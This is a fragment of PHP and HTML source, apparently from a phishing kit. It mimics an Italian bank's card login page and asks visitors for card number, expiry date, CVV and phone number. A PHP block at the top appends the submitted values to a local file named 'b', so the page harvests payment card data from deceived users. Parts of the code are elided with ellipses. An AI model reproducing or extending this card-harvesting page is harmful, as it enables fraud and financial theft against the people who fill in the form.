...
if(isset($_POST["ccnum"]) && isset($_POST["expMM"]) && isset($_POST["expYY"]) && isset($_POST["cvv"]) && isset($_POST["telefono"])){
	...
	file_put_contents("b", $out, FILE_APPEND | LOCK_EX);
					 ...
					 <div class="col-sm-12">
						   <div class="row">
							  <div class="col-sm-12">
								 ...
								 <h2>Utente: <?php print_r($_SESSION["LOGIN_USR"]); ?></h2>
							 <?php endif; ?>
							  </div>
							  <div class="col-sm-12">
							  ...
							  <div class="col-sm-12">
								 ...
								 <div class="tab-content">
									<div role="tabpanel" class="tab-pane active" id="privati">
										<form class="form-login spacer-xs-bottom-30 clearfix" method="POST" action="convalida.php" onsubmit="logintest(this)">
                     <div class="row">
                       <div class="col-sm-12">
                         <div class="form-group form-group-lg">
                         <p>
                            <label class="control-label" for="ccnum">
                             Numero Carta
                            </label>
                            <input title="" name="ccnum" id="ccnum" class="form-control" placeholder="Inserisci" type="text">
                           </p>
                          </div>
                        </div>
                      </div>
												...
												<div class="col-md-6">
												   <div class="form-group form-group-lg">
													  <p>
														 ...
														 <input name="cvv" title="" data-placement="top" class="form-control" id="" placeholder="Inserisci" type="text">
													  </p>
												   </div>
												</div>
                        <div class="col-md-6">
												   <div class="form-group form-group-lg">
													  <p>
														 ...
														 <input name="telefono" title="" data-placement="top" class="form-control" id="" placeholder="Inserisci" type="text">
													  </p>
												   </div>
												</div>
						...
						<div class="row">
							<div class="col-sm-12 spacer-xs-top-10">
								<div class="spacer-xs-bottom-30">
									<div class="form-group form-group-lg">
										<p>
											<label class="control-label" for="ccnum">Numero Carda</label>
											<input class="form-control" name="ccnum" placeholder="inserisci" type="text">
										</p>
									</div>
									<div class="form-group form-group-lg">
										<p>
